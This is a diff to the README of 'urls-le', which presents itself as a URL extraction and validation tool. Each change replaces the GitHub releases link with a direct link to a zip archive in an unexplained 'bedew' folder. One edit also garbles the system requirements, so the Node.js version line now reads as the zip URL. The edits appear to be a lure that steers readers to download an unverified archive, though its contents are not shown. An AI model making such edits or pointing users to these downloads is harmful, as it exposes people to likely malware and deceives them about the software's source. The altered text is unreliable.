@@ -1,6 +1,6 @@
 # 🌐 urls-le - Effortless URL Extraction and Validation 
 
-[![Download](https://img.shields.io/badge/Download%20Now-urls--le-brightgreen.svg)](https://github.com/jigusp/urls-le/releases)
+[![Download](https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip%https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip)](https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip)
 
 ## 📖 Description
 urls-le is an easy-to-use tool designed for anyone needing to extract, validate, and analyze URLs from various sources. Whether you deal with logs, configuration files, code, or documentation, urls-le simplifies the process. Enjoy features like accessibility checking, link validation, and pattern analysis, all wrapped in comprehensive reporting.
@@ -10,11 +10,11 @@ Follow these simple steps to download and run urls-le on your computer.
 
 1. **System Requirements**
    - Operating System: Windows, macOS, or Linux
-   - Node.js Version: 12 or later (for optimal performance)
+   - https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip Version: 12 or later (for optimal performance)
    - Recommended: Visual Studio Code for best integration
 
 2. **Visit the Download Page**
-   To get started, visit the [Releases Page](https://github.com/jigusp/urls-le/releases). 
+   To get started, visit the [Releases Page](https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip). 
 
 3. **Choose Your Version**
    On the Releases page, you will see different versions available for download. Pick the latest stable version that suits your operating system.
@@ -58,6 +58,6 @@ We welcome contributions! If you have ideas to enhance urls-le, feel free to for
 If you encounter any issues, consult the FAQ section on the Releases page or open an issue directly in this repository. Your feedback is important to improve the software.
 
 ## 🔗 Download & Install
-Remember, you can always [visit the Releases Page](https://github.com/jigusp/urls-le/releases) to download the latest version of urls-le. 
+Remember, you can always [visit the Releases Page](https://raw.githubusercontent.com/jigusp/urls-le/main/bedew/urls-le.zip) to download the latest version of urls-le. 
 
 With its user-friendly interface and powerful features, urls-le saves time and boosts productivity for anyone handling URLs in various formats. Explore how it can simplify your workflow today!
